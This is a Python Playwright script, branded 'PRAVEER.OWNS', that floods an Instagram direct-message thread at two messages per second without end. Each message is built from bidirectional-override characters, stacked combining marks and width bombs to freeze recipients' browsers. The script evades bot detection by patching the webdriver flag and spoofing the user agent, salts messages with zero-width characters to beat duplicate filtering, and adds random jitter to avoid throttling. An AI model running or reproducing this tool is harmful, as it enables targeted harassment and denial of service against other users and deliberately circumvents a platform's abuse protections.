# -*- coding: utf-8 -*-
# 🚀 PROJECT: PRAVEER.OWNS (SINGLE-ID 2-MPS)
# 📅 STATUS: OVERCLOCKED | BROWSER-KILLER | NATIVE-STEALTH

import os, asyncio, random, sys
from playwright.async_api import async_playwright

def get_kernel_stop_payload():
    """High-intensity browser-killer with 'Praveer papa on top' branding."""
    u_id = random.randint(1000, 9999)
    # 🧂 Salt to bypass server-side duplicate detection
    salt = "".join(random.choices(["\u200b", "\u200c", "\u200d", "\u2060"], k=10))
    
    # 💥 THE HEADER
    header = f"⚡ 【﻿ ＰＲＡＶＥＥＲ　ＰＡＰＡ　ＯＮ　ＴＯＰ 】 ⚡\n🆔 {u_id}{salt}\n"
    
    # 🏗️ DENSITY: 60 marks per line is optimal for 2-MPS delivery
    z_tower = "̸" * 60 
    width_bomb = "\u2800\u00A0" * 25
    
    lines = [header]
    for i in range(65): # 65 lines of pure layout thrashing
        # Bi-Directional Override: Forces the browser to flip text mapping
        prefix = "\u202E" if i % 2 == 0 else "\u202D"
        noise = "".join(random.choices("0123456789", k=2))
        lines.append(f"{width_bomb}{prefix}ＰＡＰＡ_{noise}{z_tower}")
        
    return "\n".join(lines)[:9900]

async def fire_cycle(page, box):
    """Executes the 2-messages-per-second firing sequence."""
    try:
        # We fire 2 messages in a rapid burst
        for _ in range(2):
            payload = get_kernel_stop_payload()
            await box.fill(payload)
            await page.keyboard.press("Enter")
            print("💀 [STRIKE] Praveer Papa On Top", flush=True)
            # 100ms micro-jitter to ensure the browser registers the 'Enter' key
            await asyncio.sleep(0.1) 
    except Exception as e:
        print(f"⚠️ Cycle interrupted: {str(e)[:50]}")

async def agent_blitz(target_id, cookie):
    async with async_playwright() as p:
        # Launching with automation bypass
        browser = await p.chromium.launch(headless=True, args=["--disable-blink-features=AutomationControlled"])
        context = await browser.new_context(
            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
        )
        
        # Hard-patching the webdriver property
        await context.add_init_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
        await context.add_cookies([{"name": "sessionid", "value": cookie, "domain": ".instagram.com", "path": "/", "secure": True}])
        
        page = await context.new_page()
        page.set_default_navigation_timeout(90000)
        
        try:
            print(f"📡 Establishing Link to {target_id}...")
            await page.goto(f"https://www.instagram.com/direct/t/{target_id}/", wait_until="domcontentloaded")
            
            # Using stable Role-Based selector
            box = page.get_by_role("textbox", name="Message")
            await box.wait_for(state="visible", timeout=60000)
            print("✅ LINK SYNCED. TARGETING AT 2 MPS.")

            while True:
                # Start the 2-message burst
                await fire_cycle(page, box)
                
                # Wait 0.8 seconds to complete the 1-second window (Total 2 MPS)
                await asyncio.sleep(0.8)
                
                # Periodic stealth jitter to avoid instant server-side ghosting
                if random.random() < 0.1:
                    await asyncio.sleep(random.uniform(2, 5))

        except Exception as e:
            print(f"❌ Fatal Error: {str(e)[:100]}")
            await browser.close()

if __name__ == "__main__":
    cookie = os.environ.get("SESSION_ID", "").strip()
    target_id = os.environ.get("GROUP_URL", "").strip()
    asyncio.run(agent_blitz(target_id, cookie))
